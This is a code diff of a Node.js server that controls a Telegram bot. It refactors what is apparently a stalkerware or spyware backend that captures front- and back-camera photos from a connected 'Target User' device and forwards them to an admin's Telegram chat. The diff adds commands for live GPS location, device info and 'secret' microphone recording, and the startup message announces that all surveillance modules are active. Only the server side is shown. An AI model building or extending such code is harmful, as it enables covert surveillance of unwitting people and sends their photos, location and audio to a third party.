@@ -2,7 +2,6 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const TelegramBot = require('node-telegram-bot-api');
-const multer = require('multer');
 const path = require('path');
 require('dotenv').config();
 
@@ -18,72 +17,61 @@ if (!token || !adminId) {
     process.exit(1);
 }
 
-// Initialize Telegram Bot
 const bot = new TelegramBot(token, { polling: true });
 
-// Session variables for approval security
-let pendingSocketId = null;
-let approvedSocketId = null;
-let pendingUsername = "Unknown";
+// Global Session Variables for Security & Approval
+global.bot = bot;
+global.adminId = adminId;
+global.io = io;
+global.pendingSocketId = null;
+global.approvedSocketId = null;
+global.pendingUsername = "Unknown";
 
-// Register Telegram Menu Commands & Online Notification
+// Register All Telegram Menu Commands
 bot.setMyCommands([
-    { command: 'start', description: 'Start the bot and check status' },
-    { command: 'approve', description: 'Authorize pending device connection' },
-    { command: 'moref', description: 'Front Camera 5 Photos Capture' },
-    { command: 'moreb', description: 'Back Camera 5 Photos Capture' }
+    { command: 'start', description: 'Start bot & check status' },
+    { command: 'approve', description: 'Authorize pending device' },
+    { command: 'moref', description: 'Front Camera 5 Photos' },
+    { command: 'moreb', description: 'Back Camera 5 Photos' },
+    { command: 'location', description: 'Get Live GPS Location' },
+    { command: 'info', description: 'Get Device & Battery Info' },
+    { command: 'audio', description: 'Record 5s Secret Audio' }
 ]).then(() => {
-    console.log('Telegram bot commands registered successfully!');
-    bot.sendMessage(adminId, "🟢 **Server is Online!**\nApproval security system is active.").catch(err => {});
+    console.log('All Telegram bot commands registered successfully!');
+    bot.sendMessage(adminId, "🟢 **Server is Online (Modular Mode)!**\nAll surveillance modules are active.").catch(err => {});
 }).catch(err => {
     console.error('Failed to set Telegram commands:', err);
 });
 
-// Configure Multer for in-memory photo buffer storage
-const storage = multer.memoryStorage();
-const upload = multer({ storage: storage });
-
-// Serve static frontend files
+// Middleware
+app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Upload Endpoint
-app.post('/upload', upload.single('photo'), async (req, res) => {
-    try {
-        if (!req.file) {
-            return res.status(400).send('No file uploaded.');
-        }
+// Load Feature Modules
+require('./modules/camera');
+require('./modules/location');
+require('./modules/info');
+require('./modules/audio');
 
-        await bot.sendPhoto(adminId, req.file.buffer, {
-            caption: `📸 Captured (${pendingUsername}): ${req.file.originalname || 'photo.jpg'}`
-        });
-
-        res.status(200).send({ success: true });
-    } catch (error) {
-        console.error("Error forwarding photo to Telegram:", error);
-        res.status(500).send({ success: false, error: error.message });
-    }
-});
-
-// Socket.io Connection & Security Handlers
+// Socket.io Connection & Approval Handlers
 io.on('connection', (socket) => {
     console.log('Client connected:', socket.id);
 
-    // Device connection registration request
     socket.on('register_device', (data) => {
-        pendingSocketId = socket.id;
-        pendingUsername = data.name || "Target User";
+        global.pendingSocketId = socket.id;
+        global.pendingUsername = data.name || "Target User";
 
-        bot.sendMessage(adminId, `🔔 **New Device Connection Request!**\n\n👤 Name: \`${pendingUsername}\`\n📱 Socket ID: \`${socket.id}\`\n\nType **/approve** to authorize this device.`);
+        bot.sendMessage(adminId, `🔔 **New Device Connection Request!**\n\n👤 Name: \`${global.pendingUsername}\`\n📱 Socket ID: \`${socket.id}\`\n\nType **/approve** to authorize.`);
     });
 
     socket.on('disconnect', () => {
         console.log('Client disconnected:', socket.id);
-        if (socket.id === approvedSocketId) {
-            approvedSocketId = null;
-            bot.sendMessage(adminId, `⚠️ **Device Disconnected!** The approved device has closed the session.`);
+        if (socket.id === global.approvedSocketId) {
+            global.approvedSocketId = null;
+            bot.sendMessage(adminId, `⚠️ **Device Disconnected!** Session closed.`);
         }
-        if (socket.id === pendingSocketId) {
-            pendingSocketId = null;
+        if (socket.id === global.pendingSocketId) {
+            global.pendingSocketId = null;
         }
     });
 });
@@ -92,7 +80,7 @@ io.on('connection', (socket) => {
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() === adminId.toString()) {
-        bot.sendMessage(chatId, `👋 **Welcome back, Raj bhai!**\n\nSystem Status:\n- Approved Device: ${approvedSocketId ? '🟢 Connected' : '🔴 None'}\n\nCommands:\n/approve - Authorize pending device\n/moref - Front Camera Capture\n/moreb - Back Camera Capture`);
+        bot.sendMessage(chatId, `👋 **Welcome back, Raj bhai!**\n\nSystem Status:\n- Approved Device: ${global.approvedSocketId ? '🟢 Connected' : '🔴 None'}\n\nCommands:\n/approve - Authorize device\n/moref - Front Camera\n/moreb - Back Camera\n/location - GPS Location\n/info - Device Specs\n/audio - Record Mic Audio`);
     }
 });
 
@@ -100,39 +88,13 @@ bot.onText(/\/start/, (msg) => {
 bot.onText(/\/approve/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() === adminId.toString()) {
-        if (pendingSocketId) {
-            approvedSocketId = pendingSocketId;
-            io.to(approvedSocketId).emit('device_approved');
-            bot.sendMessage(chatId, `✅ **Device Approved Successfully!**\nUser (${pendingUsername}) is now authorized.`);
-            pendingSocketId = null;
+        if (global.pendingSocketId) {
+            global.approvedSocketId = global.pendingSocketId;
+            io.to(global.approvedSocketId).emit('device_approved');
+            bot.sendMessage(chatId, `✅ **Device Approved Successfully!**\nUser (${global.pendingUsername}) is now authorized.`);
+            global.pendingSocketId = null;
         } else {
-            bot.sendMessage(chatId, "❌ No pending device request waiting for approval right now.");
-        }
-    }
-});
-
-// Telegram Command: /moref (Front Camera)
-bot.onText(/\/moref/, (msg) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() === adminId.toString()) {
-        if (approvedSocketId) {
-            bot.sendMessage(chatId, "📸 Front Camera se 5 photos capture ki ja rahi hain...");
-            io.to(approvedSocketId).emit('capture_front');
-        } else {
-            bot.sendMessage(chatId, "❌ **Access Denied / No Device Approved!** Type /approve first.");
-        }
-    }
-});
-
-// Telegram Command: /moreb (Back Camera)
-bot.onText(/\/moreb/, (msg) => {
-    const chatId = msg.chat.id;
-    if (chatId.toString() === adminId.toString()) {
-        if (approvedSocketId) {
-            bot.sendMessage(chatId, "📸 Back Camera se 5 photos capture ki ja rahi hain...");
-            io.to(approvedSocketId).emit('capture_back');
-        } else {
-            bot.sendMessage(chatId, "❌ **Access Denied / No Device Approved!** Type /approve first.");
+            bot.sendMessage(chatId, "❌ No pending device request waiting for approval.");
         }
     }
 });
